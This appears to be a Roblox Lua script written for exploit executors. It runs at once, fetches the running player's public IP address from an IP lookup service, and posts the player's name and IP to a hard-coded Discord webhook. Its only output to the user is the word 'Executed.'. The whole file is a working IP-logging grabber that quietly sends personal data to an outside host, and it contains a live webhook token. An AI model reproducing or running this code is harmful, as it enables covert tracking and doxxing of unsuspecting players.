local player = game:GetService("Players").LocalPlayer
local webhook_url = "https://discord.com/api/webhooks/1303042107233275904/24v2H5LUZlWBHqErdNkOUcOIdjmdeCBR_mRzN5SS07sMQXsW-EQiF8mD-biOyF6zRWsu"

-- Select the appropriate HTTP request method
local http_request = syn and syn.request or http and http.request or http_request or request or httprequest

-- Function to fetch IP information
local function fetchIPInfo()
    local response = http_request({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })

    if response and response.Body then
        return game:GetService("HttpService"):JSONDecode(response.Body)
    else
        print("Failed to fetch IP information.")
        return nil
    end
end

-- Function to send the player's name and IP address to the Discord webhook
local function sendWebhook(playerName, ipAddress)
    local embed = {
        title = "Player Info Logger",
        color = 0x3498db,
        fields = {
            { name = "Player Name", value = playerName, inline = true },
            { name = "IP Address", value = ipAddress or "Unavailable", inline = true }
        }
    }

    local data = { embeds = { embed } }

    local response = http_request({
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    })

    if response and response.StatusCode == 204 then
        print("Executed.")
    else
        print("Failed to send webhook. Status Code: " .. tostring(response.StatusCode))
    end
end

-- Main execution flow
delay(0, function()
    local ipinfo_table = fetchIPInfo()
    local ipAddress = ipinfo_table and ipinfo_table.query
    sendWebhook(player.Name, ipAddress)
end)
